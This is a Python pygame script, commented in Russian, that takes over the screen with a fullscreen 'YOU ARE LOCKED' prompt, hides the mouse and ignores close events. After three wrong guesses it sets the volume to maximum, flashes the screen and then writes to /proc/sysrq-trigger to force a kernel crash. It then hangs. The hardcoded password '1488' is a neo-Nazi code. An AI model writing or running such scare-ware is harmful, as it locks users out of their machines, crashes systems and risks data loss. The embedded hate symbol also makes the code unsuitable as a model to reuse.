#!/usr/bin/env python3
import os, sys, time, threading, subprocess
import pygame
from pygame.locals import *

PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS
input_buffer = ""

# ---------- громкий звук ----------
def play_loud_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

# ---------- kernel panic ----------
def trigger_kernel_panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

# ---------- инициализация Pygame ----------
pygame.init()
info = pygame.display.Info()
screen = pygame.display.set_mode((info.current_w, info.current_h),
                                 pygame.FULLSCREEN | pygame.NOFRAME)
pygame.display.set_caption("LOCKED")
pygame.mouse.set_visible(False)

# шрифт (встроенный, всегда доступен)
font = pygame.font.SysFont("monospace", 28, bold=True)
font_small = pygame.font.SysFont("monospace", 22)

# цвета
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED   = (255, 0, 0)
WHITE = (255, 255, 255)

# ---------- отрисовка экрана ----------
def draw_screen():
    screen.fill(BLACK)
    # заголовок
    txt = font.render("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", True, GREEN)
    screen.blit(txt, (screen.get_width()//2 - txt.get_width()//2, 50))
    # попытки
    txt2 = font_small.render(f"ATTEMPTS LEFT: {attempts_left}", True, GREEN)
    screen.blit(txt2, (screen.get_width()//2 - txt2.get_width()//2, 100))
    # звёздочки ввода
    stars = "*" * len(input_buffer)
    inp = font.render(f"> {stars}", True, GREEN)
    screen.blit(inp, (screen.get_width()//2 - inp.get_width()//2, 150))
    # цифровая клавиатура
    keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
    for i, row in enumerate(keys):
        txt_key = font_small.render(row, True, GREEN)
        screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
    pygame.display.flip()

# ---------- главный цикл ----------
running = True
draw_screen()

while running:
    for event in pygame.event.get():
        if event.type == KEYDOWN:
            if event.key == K_RETURN:
                if input_buffer == PASSWORD:
                    running = False
                    pygame.quit()
                    sys.exit(0)
                else:
                    input_buffer = ""
                    attempts_left -= 1
                    if attempts_left <= 0:
                        draw_screen()
                        # запускаем звук и мигание в фоне
                        threading.Thread(target=play_loud_sound, daemon=True).start()
                        # мигание (10 циклов)
                        for i in range(10):
                            color = RED if i % 2 == 0 else WHITE
                            screen.fill(color)
                            pygame.display.flip()
                            time.sleep(0.1)
                        screen.fill(BLACK)
                        pygame.display.flip()
                        # через 5 секунд kernel panic
                        threading.Timer(5.0, trigger_kernel_panic).start()
                        running = False
                    else:
                        draw_screen()
            elif event.key == K_BACKSPACE:
                input_buffer = input_buffer[:-1]
                draw_screen()
            elif event.key in (K_0, K_1, K_2, K_3, K_4, K_5, K_6, K_7, K_8, K_9):
                if len(input_buffer) < 4:
                    input_buffer += chr(event.key)
                    draw_screen()
            # все остальные клавиши игнорируются
        if event.type == QUIT:
            pass   # игнорируем попытки закрыть окно мышью

# если вышли из цикла (только при провале), оставляем висеть до перезагрузки
while True:
    time.sleep(1)
